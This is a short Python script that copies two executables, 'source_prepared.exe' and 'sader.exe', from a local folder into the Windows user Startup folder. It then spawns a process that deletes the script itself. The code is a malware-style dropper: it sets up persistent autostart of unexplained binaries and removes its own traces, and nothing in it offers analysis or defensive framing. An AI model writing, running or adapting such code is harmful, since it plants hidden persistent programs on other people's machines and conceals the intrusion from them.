import os
import shutil

shutil.move(f"{os.getcwd()}\önemliler\source_prepared.exe", f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
shutil.move(f"{os.getcwd()}\önemliler\sader.exe", f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
import sys, subprocess 
subprocess.Popen("python -c \"import os, time; time.sleep(1); os.remove('{}');\"".format(sys.argv[0]))
sys.exit(0)